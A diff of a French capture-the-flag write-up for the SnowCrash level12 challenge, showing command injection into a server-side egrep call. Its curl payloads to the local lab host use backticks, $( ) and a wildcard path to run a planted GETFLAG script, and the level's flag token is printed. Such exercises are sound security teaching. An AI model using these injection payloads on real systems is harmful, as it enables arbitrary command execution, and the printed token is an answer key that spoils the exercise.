@@ -60,7 +60,7 @@ Content-Type: text/html
 ```
 OK pour utiliser la faille et injecter une commande dans `egrep "^$xx" /tmp/xd 2>&1`, on va utiliser un x= dans l'url :
 
-x=getflag, mais on sait que avant il x sera mis en majuscule. Il faut donc qu'on puisse appeler GETFLAG.
+x=getflag, mais on sait que avant il sera mis en majuscule. Il faut donc qu'on puisse appeler GETFLAG.
 
 pour cela on va utiliser utiliser le wildcard:
 
@@ -89,15 +89,11 @@ level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
 ```
 # deuxième solution **BEST**
 
-le repertoire run/shm est monté en tant que système de fichiers tmpfs:
+
+on faire un un petit script *GETFLAG*
+
 ```shell
-level12@SnowCrash:~$ mount | grep 'run/shm'
-none on /run/shm type tmpfs (rw,nosuid,nodev)
-```
-et on a les droit d'écriture
-on va donc faire un un petit script que l'on nomera GETFLAG
-```shell
-level12@SnowCrash: vi /run/shm/GETFLAG
+level12@SnowCrash: vi /tmp/GETFLAG
 ```
 ```shell
 #!/bin/sh
@@ -105,6 +101,11 @@ level12@SnowCrash: vi /run/shm/GETFLAG
 getflag > /tmp/token
 ```
 L'avantage c'est que c'est dans le script que l'on maitrise la sortie de getflag.
+on peut aussi envoyer le resultat avec wall : 
+```shell
+getflag | wall
+```
+On change le chmod 755
 
 Maintenant la commande curl ne passe pas pas les erreur de apache et on a pas besoins de coder 'url'
 ```shell
@@ -112,4 +113,8 @@ level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`/*/GETFLAG`'
 
 level12@SnowCrash:~$ cat /tmp/token
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
+On aurait pu avec :
+```shell
+level12@SnowCrash:~$ curl '127.0.0.1:4646?x=$(/*/GETFLAG)'
 ```
